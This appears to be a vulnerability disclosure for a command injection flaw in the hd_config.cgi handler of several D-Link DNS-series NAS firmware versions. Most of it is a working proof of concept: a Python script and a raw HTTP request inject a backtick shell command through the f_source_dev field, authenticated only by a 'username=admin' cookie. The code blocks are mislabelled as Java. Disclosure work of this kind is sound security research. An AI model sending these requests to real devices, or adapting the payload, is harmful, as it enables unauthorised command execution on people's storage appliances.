
# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_FMT_R5_SpareDsk_DiskMGR function of the file /cgi-bin/hd_config.cgi.  The variable `f_source_dev`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 15 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723736925887-862f64f8-91cb-476d-b98a-cc272279d0c0.png#averageHue=%23fafaf8&clientId=u6f5fb589-b626-4&from=paste&height=204&id=mzw3V&originHeight=204&originWidth=1095&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40698&status=done&style=none&taskId=uc7d1aa27-823f-424b-b256-1275a27cc23&title=&width=1095)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/hd_config.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_FMT_R5_SpareDsk_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/133`&f_file_system=1&f_newly_dev=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```java
POST /cgi-bin/hd_config.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 108
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_FMT_R5_SpareDsk_DiskMGR&f_volume_name=1&f_source_dev=`touch+/tmp/133`&f_file_system=1&f_newly_dev=1
```


